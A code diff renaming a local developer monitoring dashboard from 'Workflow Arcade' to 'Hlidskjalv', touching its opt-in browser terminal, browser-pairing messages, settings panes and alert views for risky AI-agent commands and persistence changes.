     slot.dataset.state = "off";
     return slot.replaceChildren(h("section", { class: "panel termoff" },
       h("h3", { text: mode === "demo" ? "Not available in the example" : "The terminal is switched off" }),
-      h("p", { class: "muted", style: "margin:0", text: "It's off by default because a shell in a web page can do anything you can. Switch it on in Settings → Features, or start the Arcade with --terminal (Linux and macOS; Windows experimental):" }),
-      h("div", { class: "cmd", text: "python3 -m workflow_arcade watch ~/projects/my-app --terminal" }),
+      h("p", { class: "muted", style: "margin:0", text: "It's off by default because a shell in a web page can do anything you can. Switch it on in Settings → Features, or start Hlidskjalv with --terminal (Linux and macOS; Windows experimental):" }),
+      h("div", { class: "cmd", text: "python3 -m hlidskjalv watch ~/projects/my-app --terminal" }),
       h("ul", { class: "dlist" },
-        h("li", { class: "ok" }, "Only this page can connect", h("small", { text: "Other websites and other users on this computer are refused: the Arcade checks the page's origin and a secret key made fresh at every start." })),
-        h("li", { class: "ok" }, "Only paired browsers", h("small", { text: "A browser is paired once with a one-time link (the one the Arcade opens, or: python3 -m workflow_arcade pair). After the first use the link is worthless, even if someone copies it." })),
+        h("li", { class: "ok" }, "Only this page can connect", h("small", { text: "Other websites and other users on this computer are refused: Hlidskjalv checks the page's origin and a secret key made fresh at every start." })),
+        h("li", { class: "ok" }, "Only paired browsers", h("small", { text: "A browser is paired once with a one-time link (the one Hlidskjalv opens, or: python3 -m hlidskjalv pair). After the first use the link is worthless, even if someone copies it." })),
         h("li", { class: "warn" }, "It's a real shell", h("small", { text: "Commands run as you, in the project folder. Use the command decoder in Learn when you're unsure what a command does." })))));
   }
   if (slot.dataset.state === "on") { requestAnimationFrame(() => TERM.fit && TERM.fit.fit()); return; }
@@ -1680,14 +1680,14 @@ function renderTerminal() {
     term.onResize(({ cols, rows }) => { if (TERM.ws && TERM.ws.readyState === 1) TERM.ws.send(JSON.stringify({ size: [cols, rows] })); });
     addEventListener("resize", () => { if (currentTab === "terminal") fit.fit(); });
     termConnect(false);
-  }).catch(() => termStatus("Couldn't load the terminal files from the Arcade."));
+  }).catch(() => termStatus("Couldn't load the terminal files from Hlidskjalv."));
 }
 function termConnect(fresh) {
   const term = TERM.term; if (!term) return;
   if (TERM.ws) { TERM.ws.onclose = null; TERM.ws.close(); TERM.ws = null; }
   if (fresh) term.reset();
   const key = OWNER.key;
-  if (!key) return termStatus("This browser isn't paired. Run: python3 -m workflow_arcade pair");
+  if (!key) return termStatus("This browser isn't paired. Run: python3 -m hlidskjalv pair");
   const ws = new WebSocket(`ws://${location.host}/api/term`); ws.binaryType = "arraybuffer"; TERM.ws = ws;
   termStatus("Connecting…");
   ws.onopen = () => ws.send(JSON.stringify({ key, size: [term.cols, term.rows] }));
@@ -1700,8 +1700,8 @@ function termConnect(fresh) {
   ws.onclose = e => {
     if (TERM.ws !== ws) return;
     TERM.ws = null;
-    if (e.code === 1008) { OWNER.forget(); termStatus("This browser isn't paired (any more). Run: python3 -m workflow_arcade pair"); }
-    else if (e.code === 1013) termStatus("Too many terminals open. Close another Arcade tab first.");
+    if (e.code === 1008) { OWNER.forget(); termStatus("This browser isn't paired (any more). Run: python3 -m hlidskjalv pair"); }
+    else if (e.code === 1013) termStatus("Too many terminals open. Close another Hlidskjalv tab first.");
     else termStatus("Disconnected. Press New shell to start another.");
   };
   term.focus();
@@ -1709,7 +1709,7 @@ function termConnect(fresh) {
 
 /* =========================================================== settings: defaults, look, background */
 // Same as settings.defaults() on the server; a test keeps the two identical.
-const DEFAULT_PREFS = /*DEFAULTS*/{"setup_done":false,"look":{"mode":"system","palette":"neutral","accent":null,"surface":null,"text":null,"font":"system","font_size":15,"density":"comfortable","radius":12,"animations":true,"background":{"type":"solid","colors":[],"angle":135,"particles":{"density":60,"speed":1.0,"size":2.0,"color":null,"links":true}}},"layout":{"nav_position":"top","nav_labels":false,"views":["live","replay","learn","details","terminal","alerts"],"hidden":[],"default_view":"live"},"features":{"terminal":false,"xp":true},"alerts":{"ai_commands":true,"refused_access":true,"persistence":true,"system_log":true,"view":"grouped","toast_min":"high","notify":false,"sound":false,"colors":{"info":null,"medium":null,"high":null,"critical":null}},"sources":{"switchboard_log":null,"claude_code":true},"usage":{"fresh_threshold":150000}}/*END*/;
+const DEFAULT_PREFS = /*DEFAULTS*/{"setup_done":false,"look":{"mode":"system","palette":"neutral","accent":null,"surface":null,"text":null,"font":"system","font_size":15,"density":"comfortable","radius":12,"animations":true,"background":{"type":"solid","colors":[],"angle":135,"particles":{"density":60,"speed":1.0,"size":2.0,"color":null,"links":true}}},"layout":{"nav_position":"top","nav_labels":false,"views":["live","replay","learn","details","terminal","alerts"],"hidden":[],"default_view":"live"},"features":{"terminal":false,"xp":true},"alerts":{"ai_commands":true,"refused_access":true,"persistence":true,"system_log":true,"view":"grouped","toast_min":"high","notify":false,"sound":false,"colors":{"info":null,"medium":null,"high":null,"critical":null}},"sources":{"trioditis_log":null,"claude_code":true},"usage":{"fresh_threshold":150000}}/*END*/;
 const clone = o => JSON.parse(JSON.stringify(o));
 function deepMerge(base, change) {
   const out = clone(base);
@@ -1874,7 +1874,7 @@ async function savePrefs(change) {
     PREFS = deepMerge(PREFS, change); store.set("demoPrefs", PREFS); applyPrefs();
     return { settings: PREFS, restart: false };
   }
-  if (!OWNER.key) throw new Error("this browser isn't paired: run python3 -m workflow_arcade pair --open");
+  if (!OWNER.key) throw new Error("this browser isn't paired: run python3 -m hlidskjalv pair --open");
   const r = await OWNER.post("/api/settings", { change });
   PREFS = deepMerge(DEFAULT_PREFS, r.settings); applyPrefs();
   return r;
@@ -2011,10 +2011,10 @@ function featuresSection(draft, set) {
   ];
 }
 function sourcesSection(draft, set) {
-  const path = h("input", { type: "text", value: draft.sources.switchboard_log || "", placeholder: "~/switchboard/logs/decisions.jsonl", spellcheck: "false",
-    onchange: e => set("sources.switchboard_log", e.target.value.trim() || null) });
+  const path = h("input", { type: "text", value: draft.sources.trioditis_log || "", placeholder: "~/trioditis/logs/decisions.jsonl", spellcheck: "false",
+    onchange: e => set("sources.trioditis_log", e.target.value.trim() || null) });
   return [
-    field("Switchboard log", "Where Switchboard writes its decisions. Applies after a restart.", path),
+    field("Trioditis log", "Where Trioditis writes its decisions. Applies after a restart.", path),
     field("Claude Code", "Show Claude Code's AI steps for this folder (model and tokens only). Applies after a restart.", toggleCtl(draft.sources.claude_code, v => set("sources.claude_code", v), "On")),
   ];
 }
@@ -2026,7 +2026,7 @@ function openSetup() {
     ["Background", "Plain, a gradient, or slow particles.", backgroundSection],
     ["Layout", "Where the navigation sits and which views you want.", layoutSection],
     ["Features", null, featuresSection],
-    ["Sources", "Where the Arcade looks for AI steps.", sourcesSection],
+    ["Sources", "Where Hlidskjalv looks for AI steps.", sourcesSection],
   ];
   let i = 0, saved = false;
   const body = h("div", { class: "setup" }), dots = h("ol", { class: "steps" });
@@ -2038,7 +2038,7 @@ function openSetup() {
   function render() {
     const [name, hint, build] = steps[i];
     dots.replaceChildren(...steps.map(([n], k) => h("li", { class: k === i ? "on" : k < i ? "done" : "" }, n)));
-    const pairNote = mode !== "demo" && !OWNER.key ? h("p", { class: "risk caution", text: "This browser isn't paired yet, so these choices can't be saved. Run: python3 -m workflow_arcade pair --open" }) : null;
+    const pairNote = mode !== "demo" && !OWNER.key ? h("p", { class: "risk caution", text: "This browser isn't paired yet, so these choices can't be saved. Run: python3 -m hlidskjalv pair --open" }) : null;
     fill(body, dots, pairNote, h("h3", { text: name }), hint ? h("p", { class: "muted", style: "margin:0 0 6px", text: hint }) : null,
       h("div", { class: "fields" }, ...build(draft, set)),
       h("div", { class: "setup-foot" },
@@ -2081,7 +2081,7 @@ function openSettings(section = "look") {
   function render() {
     list.replaceChildren(...sections.map(([k, label]) => h("button", { type: "button", "aria-current": String(k === section), onclick: () => { section = k; render(); } }, label)));
     const s = sections.find(x => x[0] === section);
-    const pairNote = mode !== "demo" && !OWNER.key && s[2] ? h("p", { class: "risk caution", text: "This browser isn't paired, so changes can't be saved. Run: python3 -m workflow_arcade pair --open" }) : null;
+    const pairNote = mode !== "demo" && !OWNER.key && s[2] ? h("p", { class: "risk caution", text: "This browser isn't paired, so changes can't be saved. Run: python3 -m hlidskjalv pair --open" }) : null;
     fill(pane, pairNote, h("div", { class: "fields" }, ...(s[2] ? s[2](PREFS, set) : section === "autostart" ? autostartPane() : section === "pairing" ? pairingPane() : dataPane())));
   }
   const body = h("div", { class: "settings" }, banner, h("div", { class: "set-grid" }, list, pane));
@@ -2114,8 +2114,8 @@ function pairingPane() {
   return [
     field("This browser", null, h("span", { class: "chip " + (mode === "demo" ? "no" : OWNER.paired ? "ok" : "warn"), text: mode === "demo" ? "example only" : OWNER.paired ? "paired" : "not paired" })),
     h("p", { class: "muted", text: "Watching needs nothing. Changing settings and using the terminal need this browser to be paired once." }),
-    field("Pair a browser", "Prints a link that works once, for 10 minutes.", h("div", { class: "cmd", text: "python3 -m workflow_arcade pair --open" })),
-    field("Un-pair every browser", "Makes a new key; old ones stop working right away.", h("div", { class: "cmd", text: "python3 -m workflow_arcade pair --rotate" })),
+    field("Pair a browser", "Prints a link that works once, for 10 minutes.", h("div", { class: "cmd", text: "python3 -m hlidskjalv pair --open" })),
+    field("Un-pair every browser", "Makes a new key; old ones stop working right away.", h("div", { class: "cmd", text: "python3 -m hlidskjalv pair --rotate" })),
     OWNER.key ? field("Forget here", "Removes the key from this browser only.", h("button", { type: "button", class: "btn", onclick: () => { OWNER.forget(); toast("This browser is no longer paired."); } }, "Forget this browser")) : null,
   ];
 }
@@ -2128,7 +2128,7 @@ function dataPane() {
   return [
     field("Setup", "Walk through the first-start questions again.", h("button", { type: "button", class: "btn", onclick: () => { document.querySelector(".modal-back")?.remove(); openSetup(); } }, "Run setup again")),
     field("Export", "Download your settings as a file.", h("button", { type: "button", class: "btn", onclick: () => {
-      const a = h("a", { href: URL.createObjectURL(new Blob([JSON.stringify(PREFS, null, 2)], { type: "application/json" })), download: "arcade-settings.json" }); a.click(); } }, "Export")),
+      const a = h("a", { href: URL.createObjectURL(new Blob([JSON.stringify(PREFS, null, 2)], { type: "application/json" })), download: "hlidskjalv-settings.json" }); a.click(); } }, "Export")),
     field("Import", "Load a settings file; it's checked before anything changes.", h("div", {}, file, h("button", { type: "button", class: "btn", onclick: () => file.click() }, "Import…"))),
     field("Reset", "Back to the defaults (the setup will show again).", h("button", { type: "button", class: "btn", onclick: async () => {
       if (!confirm("Reset every setting to its default?")) return;
@@ -2145,7 +2145,7 @@ function dataPane() {
 const SEV = { critical: { n: 3, label: "Critical" }, high: { n: 2, label: "High" }, medium: { n: 1, label: "Medium" }, info: { n: 0, label: "Info" } };
 const ALERT_SOURCES = {
   ai_commands: { label: "Commands the AI ran", tip: "Risky shell commands an AI agent (Claude Code) ran in this project." },
-  refused_access: { label: "Refused access", tip: "Requests the Arcade or Switchboard turned away: other websites, wrong keys, other host names." },
+  refused_access: { label: "Refused access", tip: "Requests Hlidskjalv or Trioditis turned away: other websites, wrong keys, other host names." },
   persistence: { label: "Persistence changes", tip: "Something set itself up to run later: login items, scheduled jobs, shell startup files, SSH keys, Git hooks." },
   system_log: { label: "sudo and logins", tip: "Administrator commands and logins, from the system journal." },
 };
@@ -2195,7 +2195,7 @@ let audioCtx = null;
 function notifyAlert(a) {
   toast(`${SEV[a.severity].label}: ${a.title}`);
   if (PREFS.alerts.notify && "Notification" in window && Notification.permission === "granted") {
-    try { new Notification(`Workflow Arcade · ${SEV[a.severity].label}`, { body: a.title, tag: a.uid }); } catch {}
+    try { new Notification(`Hlidskjalv · ${SEV[a.severity].label}`, { body: a.title, tag: a.uid }); } catch {}
   }
   if (PREFS.alerts.sound) {
     try {
@@ -2217,7 +2217,7 @@ function alertCard(a, compact) {
       compact ? null : h("div", { class: "s", text: first }),
       h("div", { class: "meta" },
         h("span", { class: "chip", tip: { title: ALERT_SOURCES[a.source]?.label || a.source, body: ALERT_SOURCES[a.source]?.tip || "" } }, ALERT_SOURCES[a.source]?.label || a.source),
-        a.expected ? h("span", { class: "chip ok", tip: { title: "Expected", body: "The Arcade made this change itself (for example its own login item)." } }, "expected") : null,
+        a.expected ? h("span", { class: "chip ok", tip: { title: "Expected", body: "Hlidskjalv made this change itself (for example its own login item)." } }, "expected") : null,
         seen ? h("span", { class: "chip no" }, "seen") : null,
         h("time", { "data-ts": a.ts, text: ago(a.ts) }))),
     seen ? null : h("button", { type: "button", class: "btn small", onclick: e => { e.stopPropagation(); ackAlerts([a.uid]); } }, "Mark seen"));
